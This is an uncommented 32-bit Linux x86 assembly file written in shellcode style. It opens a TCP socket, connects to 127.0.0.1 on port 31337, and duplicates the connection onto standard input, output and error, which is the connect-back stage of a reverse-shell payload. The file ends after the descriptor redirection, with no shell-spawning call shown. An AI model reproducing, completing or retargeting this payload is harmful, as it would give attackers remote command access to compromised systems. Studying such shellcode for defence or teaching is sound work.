
.global _main	
.section .text

 _main:

    xor %eax, %eax
    push %eax
    movb $1,%al
    push %eax
    movb $2,%al
    push %eax 

    xor %eax,%eax
    movb $102, %al

    xor %ebx, %ebx
    movb $1, %bl
    
    movl %esp, %ecx
   
    xor %edx,%edx

    int $ 0x80
    movl %eax,%esi

    xor %ecx,%ecx
    movb $0x1,%cl
    shl  $24, %ecx
    add  $0x7f,%cl
    push %ecx
    pushw $0x697a

    xor %eax,%eax
    movb $2,%al
    push %ax
    
    movl %esp, %edi

     
    pushl $16
    push %edi
    push %esi
  

    xor %eax,%eax
    movb $102,%al
     
    xor %ebx,%ebx 
    movb $3,%bl

    movl %esp,%ecx

    int $0x80
   
    xor %eax,%eax
    movb $63 ,%al
    movl %esi,%ebx  
    xor %ecx, %ecx

    int $0x80

    movb $63,%al
    movb $1,%cl
    int $0x80

    movb $63,%al
    movb $2,%cl
    int $0x80    
    


	
	


